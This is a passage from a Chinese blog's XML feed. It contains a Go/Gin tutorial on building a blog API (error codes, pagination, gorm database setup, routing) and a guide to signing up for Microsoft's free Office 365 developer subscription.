id="编写API错误码包"><a href="#编写API错误码包" class="headerlink" title="编写API错误码包"></a>编写API错误码包</h2><h4 id="建立错误码包的e模块，在gin-blog中的pkg目录下创建e目录，在下创建code-go和msg-go文件。"><a href="#建立错误码包的e模块，在gin-blog中的pkg目录下创建e目录，在下创建code-go和msg-go文件。" class="headerlink" title="建立错误码包的e模块，在gin-blog中的pkg目录下创建e目录，在下创建code.go和msg.go文件。"></a>建立错误码包的e模块，在gin-blog中的pkg目录下创建e目录，在下创建code.go和msg.go文件。</h4><h4 id="1-code-go"><a href="#1-code-go" class="headerlink" title="1.code.go"></a>1.code.go</h4><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> e<span class="token keyword">const</span> <span class="token punctuation">(</span>    SUCCESS <span class="token operator">=</span> <span class="token number">200</span>    ERROR <span class="token operator">=</span> <span class="token number">500</span>    INVALID_PARAMS <span class="token operator">=</span> <span class="token number">400</span>    ERROR_EXIST_TAG <span class="token operator">=</span> <span class="token number">10001</span>    ERROR_NOT_EXIST_TAG <span class="token operator">=</span> <span class="token number">10002</span>    ERROR_NOT_EXIST_ARTICLE <span class="token operator">=</span> <span class="token number">10003</span>    ERROR_AUTH_CHECK_TOKEN_FAIL <span class="token operator">=</span> <span class="token number">20001</span>    ERROR_AUTH_CHECK_TOKEN_TIMEOUT <span class="token operator">=</span> <span class="token number">20002</span>    ERROR_AUTH_TOKEN <span class="token operator">=</span> <span class="token number">20003</span>    ERROR_AUTH <span class="token operator">=</span> <span class="token number">20004</span><span class="token punctuation">)</span></code></pre><h4 id="2-msg-go"><a href="#2-msg-go" class="headerlink" title="2.msg.go"></a>2.msg.go</h4><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> e<span class="token keyword">var</span> MsgFlags <span class="token operator">=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token builtin">string</span> <span class="token punctuation">{</span>    SUCCESS <span class="token punctuation">:</span> <span class="token string">"ok"</span><span class="token punctuation">,</span>    ERROR <span class="token punctuation">:</span> <span class="token string">"fail"</span><span class="token punctuation">,</span>    INVALID_PARAMS <span class="token punctuation">:</span> <span class="token string">"请求参数错误！"</span><span class="token punctuation">,</span>    ERROR_EXIST_TAG <span class="token punctuation">:</span> <span class="token string">"已存在该标签名称"</span><span class="token punctuation">,</span>    ERROR_NOT_EXIST_TAG <span class="token punctuation">:</span> <span class="token string">"该标签不存在"</span><span class="token punctuation">,</span>    ERROR_NOT_EXIST_ARTICLE <span class="token punctuation">:</span> <span class="token string">"该文章不存在"</span><span class="token punctuation">,</span>    ERROR_AUTH_CHECK_TOKEN_FAIL <span class="token punctuation">:</span> <span class="token string">"Token鉴权失败"</span><span class="token punctuation">,</span>    ERROR_AUTH_CHECK_TOKEN_TIMEOUT <span class="token punctuation">:</span> <span class="token string">"Token已超时"</span><span class="token punctuation">,</span>    ERROR_AUTH_TOKEN <span class="token punctuation">:</span> <span class="token string">"Token生成失败"</span><span class="token punctuation">,</span>    ERROR_AUTH <span class="token punctuation">:</span> <span class="token string">"Token错误"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">GetMsg</span><span class="token punctuation">(</span>code <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>    msg<span class="token punctuation">,</span> ok <span class="token operator">:=</span> MsgFlags<span class="token punctuation">[</span>code<span class="token punctuation">]</span>    <span class="token keyword">if</span> ok <span class="token punctuation">{</span>        <span class="token keyword">return</span> msg    <span class="token punctuation">}</span>    <span class="token keyword">return</span> MsgFlags<span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h2 id="编写工具包"><a href="#编写工具包" class="headerlink" title="编写工具包"></a>编写工具包</h2><h4 id="拉取依赖包com。"><a href="#拉取依赖包com。" class="headerlink" title="拉取依赖包com。"></a>拉取依赖包<a href="github.com/Unknwon/com">com</a>。</h4><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> get <span class="token operator">-</span>u github<span class="token punctuation">.</span>com<span class="token operator">/</span>Unknwon<span class="token operator">/</span>com</code></pre><h3 id="编写分页页码的获取方法"><a href="#编写分页页码的获取方法" class="headerlink" title="编写分页页码的获取方法"></a>编写分页页码的获取方法</h3><h4 id="在gin-blog的pkg目录下，新建util目录。在util目录下创建pagination-go"><a href="#在gin-blog的pkg目录下，新建util目录。在util目录下创建pagination-go" class="headerlink" title="在gin-blog的pkg目录下，新建util目录。在util目录下创建pagination.go"></a>在gin-blog的pkg目录下，新建util目录。在util目录下创建pagination.go</h4><h4 id="pagination-go"><a href="#pagination-go" class="headerlink" title="pagination.go"></a>pagination.go</h4><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> util<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"github.com/gin-gonic/gin"</span>    <span class="token string">"github.com/Unknwon/com"</span>    <span class="token string">"gin-blog/pkg/setting"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">Getpag</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>    result <span class="token operator">:=</span> <span class="token number">0</span>    page<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> com<span class="token punctuation">.</span><span class="token function">StrTo</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token string">"page"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Int</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>page <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> setting<span class="token punctuation">.</span>PageSize    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">}</span></code></pre><p><a href="https://postimg.cc/QHT8wVqB" target="_blank" rel="noopener">error.png</a><br><a href="https://postimg.cc/QHT8wVqB" target="_blank" rel="noopener"><img src="https://i.postimg.cc/DyCSWXJc/error.png" alt="error.png"></a></p><h4 id="根据可以看出，我们的目录错了。应该在src中创建gin-blog。可以去看看GO的工作区的使用应该可以明白。"><a href="#根据可以看出，我们的目录错了。应该在src中创建gin-blog。可以去看看GO的工作区的使用应该可以明白。" class="headerlink" title="根据可以看出，我们的目录错了。应该在src中创建gin-blog。可以去看看GO的工作区的使用应该可以明白。"></a>根据可以看出，我们的目录错了。应该在src中创建gin-blog。可以去看看GO的工作区的使用应该可以明白。</h4><h3 id="编写models-init"><a href="#编写models-init" class="headerlink" title="编写models init"></a>编写models init</h3><h4 id="拉取gorm依赖包。gorm文档"><a href="#拉取gorm依赖包。gorm文档" class="headerlink" title="拉取gorm依赖包。gorm文档"></a>拉取<a href="github.com/jinzhu/gorm">gorm</a>依赖包。<a href="http://gorm.book.jasperxu.com" target="_blank" rel="noopener">gorm文档</a></h4><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> get <span class="token operator">-</span>u github<span class="token punctuation">.</span>com<span class="token operator">/</span>jinzhu<span class="token operator">/</span>gorm</code></pre><h4 id="拉取mysql驱动依赖包。"><a href="#拉取mysql驱动依赖包。" class="headerlink" title="拉取mysql驱动依赖包。"></a>拉取<a href="github.com/go-sql-driver/mysql">mysql</a>驱动依赖包。</h4><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> get <span class="token operator">-</span>u github<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">-</span>sql<span class="token operator">-</span>driver<span class="token operator">/</span>mysql</code></pre><h4 id="在gin-blog的models目录下新建models-go，用于models的初始化使用"><a href="#在gin-blog的models目录下新建models-go，用于models的初始化使用" class="headerlink" title="在gin-blog的models目录下新建models.go，用于models的初始化使用."></a>在gin-blog的models目录下新建models.go，用于models的初始化使用.</h4><h4 id="models-go"><a href="#models-go" class="headerlink" title="models.go"></a>models.go</h4><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> models<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"log"</span>    <span class="token string">"github.com/jinzhu/gorm"</span>    <span class="token boolean">_</span> <span class="token string">"github.com/jinzhu/gorm/dialects/mysql"</span>    <span class="token string">"gin-blog/pkg/setting"</span><span class="token punctuation">)</span><span class="token keyword">var</span> db <span class="token operator">*</span>gorm<span class="token punctuation">.</span>DB<span class="token keyword">type</span> Model <span class="token keyword">struct</span> <span class="token punctuation">{</span>    ID <span class="token builtin">int</span> <span class="token string">`gorm:"primary_key" json:"id"`</span>    CreatedOn <span class="token builtin">int</span> <span class="token string">`json:"created_on"`</span>    ModifiedOn <span class="token builtin">int</span> <span class="token string">`json:"modified_on"`</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token punctuation">(</span>        err <span class="token builtin">error</span>        dbType<span class="token punctuation">,</span> dbName<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">,</span> host<span class="token punctuation">,</span> tablePrefix <span class="token builtin">string</span>    <span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// ser,err := setting.config.GetSection("database")</span>    ser<span class="token punctuation">,</span> err <span class="token operator">:=</span> setting<span class="token punctuation">.</span>config<span class="token punctuation">.</span><span class="token function">GetSection</span><span class="token punctuation">(</span><span class="token string">"database"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"Fail get selection %v"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    dbType <span class="token operator">=</span> ser<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"TYPE"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    dbName <span class="token operator">=</span> ser<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"NAME"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> ser<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"USER"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> ser<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"PASSWORD"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> ser<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"HOST"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    tablePrefix <span class="token operator">=</span> ser<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"TABLE_PREFIX"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    db<span class="token punctuation">,</span> err <span class="token operator">=</span> gorm<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>dbType<span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%s:%s@tcp(%s)/%s?charset=utf8&amp;parseTime=True&amp;loc=Local"</span><span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">,</span> host<span class="token punctuation">,</span> dbName<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    gorm<span class="token punctuation">.</span>DefaultTableNameHandler <span class="token operator">=</span> <span class="token keyword">func</span> <span class="token punctuation">(</span>db <span class="token operator">*</span>gorm<span class="token punctuation">.</span>DB<span class="token punctuation">,</span> defaultTableName <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> tablePrefix <span class="token operator">+</span> defaultTableName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    db<span class="token punctuation">.</span><span class="token function">SingularTable</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">DB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">SetMaxIdleConns</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span><span class="token function">DB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">SetMaxOpenConns</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">CloseDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">defer</span> db<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p><a href="https://postimg.cc/75S3Ngtm" target="_blank" rel="noopener">error1.png</a><br><a href="https://postimg.cc/75S3Ngtm" target="_blank" rel="noopener"><img src="https://i.postimg.cc/g2TgmsVF/error1.png" alt="error1.png"></a></p><h4 id="出现问题。和之前的一样，但是目前的目录已经迁移到src-gin-blog。"><a href="#出现问题。和之前的一样，但是目前的目录已经迁移到src-gin-blog。" class="headerlink" title="出现问题。和之前的一样，但是目前的目录已经迁移到src/gin-blog。"></a>出现问题。和之前的一样，但是目前的目录已经迁移到src/gin-blog。</h4><h2 id="编写项目启动，路由文件。"><a href="#编写项目启动，路由文件。" class="headerlink" title="编写项目启动，路由文件。"></a>编写项目启动，路由文件。</h2><h3 id="编写demo"><a href="#编写demo" class="headerlink" title="编写demo"></a>编写demo</h3><h4 id="在gin-blog的目录下创建main-go为启动文件。"><a href="#在gin-blog的目录下创建main-go为启动文件。" class="headerlink" title="在gin-blog的目录下创建main.go为启动文件。"></a>在gin-blog的目录下创建main.go为启动文件。</h4><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"gin-blog/pkg/setting"</span>    <span class="token string">"net/http"</span>    <span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    router <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    router<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    s <span class="token operator">:=</span> <span class="token operator">&amp;</span>http<span class="token punctuation">.</span>Server<span class="token punctuation">{</span>        Addr<span class="token punctuation">:</span>           fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">":%d"</span><span class="token punctuation">,</span> setting<span class="token punctuation">.</span>Httpport<span class="token punctuation">)</span><span class="token punctuation">,</span>        Handler<span class="token punctuation">:</span>        router<span class="token punctuation">,</span>        ReadTimeout<span class="token punctuation">:</span>    setting<span class="token punctuation">.</span>ReadTimeOut<span class="token punctuation">,</span>        WriteTimeout<span class="token punctuation">:</span>   setting<span class="token punctuation">.</span>WriteTimeOut<span class="token punctuation">,</span>        MaxHeaderBytes<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    s<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li><h5 id="Addr：监听的TCP地址，格式为-8000"><a href="#Addr：监听的TCP地址，格式为-8000" class="headerlink" title="Addr：监听的TCP地址，格式为:8000"></a>Addr：监听的TCP地址，格式为:8000</h5></li><li><h5 id="Handler：http句柄，实质为ServeHTTP，用于处理程序响应HTTP请求"><a href="#Handler：http句柄，实质为ServeHTTP，用于处理程序响应HTTP请求" class="headerlink" title="Handler：http句柄，实质为ServeHTTP，用于处理程序响应HTTP请求"></a>Handler：http句柄，实质为ServeHTTP，用于处理程序响应HTTP请求</h5></li><li><h5 id="TLSConfig：安全传输层协议（TLS）的配置"><a href="#TLSConfig：安全传输层协议（TLS）的配置" class="headerlink" title="TLSConfig：安全传输层协议（TLS）的配置"></a>TLSConfig：安全传输层协议（TLS）的配置</h5></li><li><h5 id="ReadTimeout：允许读取的最大时间"><a href="#ReadTimeout：允许读取的最大时间" class="headerlink" title="ReadTimeout：允许读取的最大时间"></a>ReadTimeout：允许读取的最大时间</h5></li><li><h5 id="ReadHeaderTimeout：允许读取请求头的最大时间"><a href="#ReadHeaderTimeout：允许读取请求头的最大时间" class="headerlink" title="ReadHeaderTimeout：允许读取请求头的最大时间"></a>ReadHeaderTimeout：允许读取请求头的最大时间</h5></li><li><h5 id="WriteTimeout：允许写入的最大时间"><a href="#WriteTimeout：允许写入的最大时间" class="headerlink" title="WriteTimeout：允许写入的最大时间"></a>WriteTimeout：允许写入的最大时间</h5></li><li><h5 id="IdleTimeout：等待的最大时间"><a href="#IdleTimeout：等待的最大时间" class="headerlink" title="IdleTimeout：等待的最大时间"></a>IdleTimeout：等待的最大时间</h5></li><li><h5 id="MaxHeaderBytes：请求头的最大字节数"><a href="#MaxHeaderBytes：请求头的最大字节数" class="headerlink" title="MaxHeaderBytes：请求头的最大字节数"></a>MaxHeaderBytes：请求头的最大字节数</h5></li><li><h5 id="ConnState：指定一个可选的回调函数，当客户端连接发生变化时调用"><a href="#ConnState：指定一个可选的回调函数，当客户端连接发生变化时调用" class="headerlink" title="ConnState：指定一个可选的回调函数，当客户端连接发生变化时调用"></a>ConnState：指定一个可选的回调函数，当客户端连接发生变化时调用</h5></li><li><h5 id="ErrorLog：指定一个可选的日志记录器，用于接收程序的意外行为和底层系统错误；如果未设置或为nil则默认以日志包的标准日志记录器完成（也就是在控制台输出）"><a href="#ErrorLog：指定一个可选的日志记录器，用于接收程序的意外行为和底层系统错误；如果未设置或为nil则默认以日志包的标准日志记录器完成（也就是在控制台输出）" class="headerlink" title="ErrorLog：指定一个可选的日志记录器，用于接收程序的意外行为和底层系统错误；如果未设置或为nil则默认以日志包的标准日志记录器完成（也就是在控制台输出）"></a>ErrorLog：指定一个可选的日志记录器，用于接收程序的意外行为和底层系统错误；如果未设置或为nil则默认以日志包的标准日志记录器完成（也就是在控制台输出）</h5><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> run main<span class="token punctuation">.</span><span class="token keyword">go</span>curl <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>test<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">}</span></code></pre><h3 id="修改路由规则"><a href="#修改路由规则" class="headerlink" title="修改路由规则"></a>修改路由规则</h3><h4 id="在routers目录下创建router-go"><a href="#在routers目录下创建router-go" class="headerlink" title="在routers目录下创建router.go"></a>在routers目录下创建router.go</h4><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> routers</code></pre></li></ul><p>import (<br>    “gin-blog/pkg/setting”<br>    “github.com/gin-gonic/gin”<br>)</p><p>func InitRouter() *gin.Engine {<br>    r := gin.New()<br>    r.Use(gin.Logger())<br>    r.Use(gin.Recovery())</p><pre><code>gin.SetMode(setting.RunModel)r.GET(&quot;/test&quot;,func(c *gin.Context){    c.JSON(200,gin.H{        &quot;message&quot;:&quot;ok&quot;,    })})</code></pre><p>  return r<br>}</p><pre><code>#### 修改main.go```gopackage mainimport (    &quot;fmt&quot;    &quot;gin-blog/pkg/setting&quot;    &quot;net/http&quot;    &quot;gin-blog/routers&quot;    // &quot;github.com/gin-gonic/gin&quot;)func main() {    router := routers.InitRouter()    // router := gin.Default()    // router.GET(&quot;/test&quot;, func(c *gin.Context) {    //     c.JSON(200, gin.H{    //         &quot;message&quot;: &quot;test&quot;,    //     })    // })    s := &amp;http.Server{        Addr:           fmt.Sprintf(&quot;:%d&quot;, setting.Httpport),        Handler:        router,        ReadTimeout:    setting.ReadTimeOut,        WriteTimeout:   setting.WriteTimeOut,        MaxHeaderBytes: 1 &lt;&lt; 20,    }    s.ListenAndServe()}</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> run main<span class="token punctuation">.</span><span class="token keyword">go</span>curl <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>test<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span><span class="token string">"ok"</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
            <tag> gin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教你如何获得免费的Office 365账户</title>
      <link href="/2018/10/17/jiao-ni-ru-he-huo-de-mian-fei-de-office-365-zhang-hu/"/>
      <url>/2018/10/17/jiao-ni-ru-he-huo-de-mian-fei-de-office-365-zhang-hu/</url>
      
        <content type="html"><![CDATA[<h1 id="教你如何获得免费的Office-365账户"><a href="#教你如何获得免费的Office-365账户" class="headerlink" title="教你如何获得免费的Office 365账户"></a>教你如何获得免费的Office 365账户</h1><blockquote><p>申明，这是微软 Office 365 面向开发者提供的免费订阅，是不能应用于企业、个人的商业使用的，理论上只能用于开发测试使用，请大家合理使用。</p></blockquote><h2 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h2><ul><li>微软帐号</li><li>可以接收短信的手机/号码<h2 id="2-申请帐号"><a href="#2-申请帐号" class="headerlink" title="2.申请帐号"></a>2.申请帐号</h2>链接：<a href="https://developer.microsoft.com/zh-cn/office/dev-program" target="_blank" rel="noopener">主页 - 开发人员计划</a><br>![join](教你如何获得免费的Office 365账户/join.png)  </li></ul><h3 id="登录自己的微软帐号。"><a href="#登录自己的微软帐号。" class="headerlink" title="登录自己的微软帐号。"></a>登录自己的微软帐号。</h3><p>![login](教你如何获得免费的Office 365账户/login.png)</p><h3 id="登录成功填写表单"><a href="#登录成功填写表单" class="headerlink" title="登录成功填写表单"></a>登录成功填写表单</h3><p>![form](教你如何获得免费的Office 365账户/form.png)<br>![form1](教你如何获得免费的Office 365账户/form1.png)  </p><h3 id="记得选择订阅哦！！！"><a href="#记得选择订阅哦！！！" class="headerlink" title="记得选择订阅哦！！！"></a>记得选择订阅哦！！！</h3><h2 id="3-订阅设置"><a href="#3-订阅设置" class="headerlink" title="3.订阅设置"></a>3.订阅设置</h2><h3 id="注册以获取为期-12-个月的免费-Office-365-开发人员订阅。"><a href="#注册以获取为期-12-个月的免费-Office-365-开发人员订阅。" class="headerlink" title="注册以获取为期 12 个月的免费 Office 365 开发人员订阅。"></a>注册以获取为期 12 个月的免费 Office 365 开发人员订阅。</h3><p>![setting](教你如何获得免费的Office 365账户/setting.png)<br>![setting1](教你如何获得免费的Office 365账户/setting1.png)<br>![setting2](教你如何获得免费的Office 365账户/setting2.png)</p><h3 id="如何你们点击没有反应，说明你需要一个可以访问外网的机器。"><a href="#如何你们点击没有反应，说明你需要一个可以访问外网的机器。" class="headerlink" title="如何你们点击没有反应，说明你需要一个可以访问外网的机器。"></a>如何你们点击没有反应，说明你需要一个可以访问外网的机器。</h3><h3 id="提交完成你将获得这样的提示。"><a href="#提交完成你将获得这样的提示。" class="headerlink" title="提交完成你将获得这样的提示。"></a>提交完成你将获得这样的提示。</h3><p>![success](教你如何获得免费的Office 365账户/success.png)</p><h2 id="4-设置office-365"><a href="#4-设置office-365" class="headerlink" title="4.设置office 365"></a>4.设置office 365</h2><h3 id="链接：Office-365-登录-Microsoft-Office"><a href="#链接：Office-365-登录-Microsoft-Office" class="headerlink" title="链接：Office 365 登录 | Microsoft Office"></a>链接：<a href="https://www.office.com/" target="_blank" rel="noopener">Office 365 登录 | Microsoft Office</a></h3><h3 id="注意：登录的账号不是微软帐号。应该是xxx-xxx-onmicrosoft-com"><a href="#注意：登录的账号不是微软帐号。应该是xxx-xxx-onmicrosoft-com" class="headerlink" title="注意：登录的账号不是微软帐号。应该是xxx@xxx.onmicrosoft.com"></a>注意：登录的账号不是微软帐号。应该是<a href="mailto:xxx@xxx.onmicrosoft.com" target="_blank" rel="noopener">xxx@xxx.onmicrosoft.com</a></h3><h3 id="这个一定需要注意，不然你是无法用个人帐号登录的。"><a href="#这个一定需要注意，不然你是无法用个人帐号登录的。" class="headerlink" title="这个一定需要注意，不然你是无法用个人帐号登录的。"></a>这个一定需要注意，不然你是无法用个人帐号登录的。</h3><h3 id="我们需要分配产品。"><a href="#我们需要分配产品。" class="headerlink" title="我们需要分配产品。"></a>我们需要分配产品。</h3><p>![office](教你如何获得免费的Office 365账户/office.png)<br>![office1](教你如何获得免费的Office 365账户/office1.png)</p><h3 id="选择你登录的账户。不是微软帐号。"><a href="#选择你登录的账户。不是微软帐号。" class="headerlink" title="选择你登录的账户。不是微软帐号。"></a>选择你登录的账户。不是微软帐号。</h3><p>![office2](教你如何获得免费的Office 365账户/office2.png)</p><h3 id="安装箭头一步一步执行。"><a href="#安装箭头一步一步执行。" class="headerlink" title="安装箭头一步一步执行。"></a>安装箭头一步一步执行。</h3><p>![office3](教你如何获得免费的Office 365账户/office3.png)  </p><h3 id="记得往下划，保存在最下方。"><a href="#记得往下划，保存在最下方。" class="headerlink" title="记得往下划，保存在最下方。"></a>记得往下划，保存在最下方。</h3><h3 id="重新登录，将可以看到自己可用的账户。"><a href="#重新登录，将可以看到自己可用的账户。" class="headerlink" title="重新登录，将可以看到自己可用的账户。"></a>重新登录，将可以看到自己可用的账户。</h3><p>![office4](教你如何获得免费的Office 365账户/office4.png)  </p><h3 id="你也可以利用win10来验证。"><a href="#你也可以利用win10来验证。" class="headerlink" title="你也可以利用win10来验证。"></a>你也可以利用win10来验证。</h3><p>![office5](教你如何获得免费的Office 365账户/office5.png)  </p><h2 id="5-配置OneDrive"><a href="#5-配置OneDrive" class="headerlink" title="5.配置OneDrive"></a>5.配置OneDrive</h2><h3 id="链接：OneDrive"><a href="#链接：OneDrive" class="headerlink" title="链接：OneDrive"></a>链接：<a href="https://admin.onedrive.com" target="_blank" rel="noopener">OneDrive</a></h3><h3 id="OneDrive默认为1024GB（1T），用此帐号可以修改为5120GB（5T）。"><a href="#OneDrive默认为1024GB（1T），用此帐号可以修改为5120GB（5T）。" class="headerlink" title="OneDrive默认为1024GB（1T），用此帐号可以修改为5120GB（5T）。"></a>OneDrive默认为1024GB（1T），用此帐号可以修改为5120GB（5T）。</h3><p>![office6](教你如何获得免费的Office 365账户/office6.png)</p><h3 id="你可以理解为就是云盘，云盘当然是越大越好，这样才能存下更多东西。"><a href="#你可以理解为就是云盘，云盘当然是越大越好，这样才能存下更多东西。" class="headerlink" title="你可以理解为就是云盘，云盘当然是越大越好，这样才能存下更多东西。"></a>你可以理解为就是云盘，云盘当然是越大越好，这样才能存下更多东西。</h3>]]></content>
      
      
      <categories>
          
          <category> 福利 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> office </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电脑换了该如何继续写博客</title>
      <link href="/2018/10/10/dian-nao-huan-liao-gai-ru-he-ji-xu-xie-bo-ke/"/>
      <url>/2018/10/10/dian-nao-huan-liao-gai-ru-he-ji-xu-xie-bo-ke/</url>
      
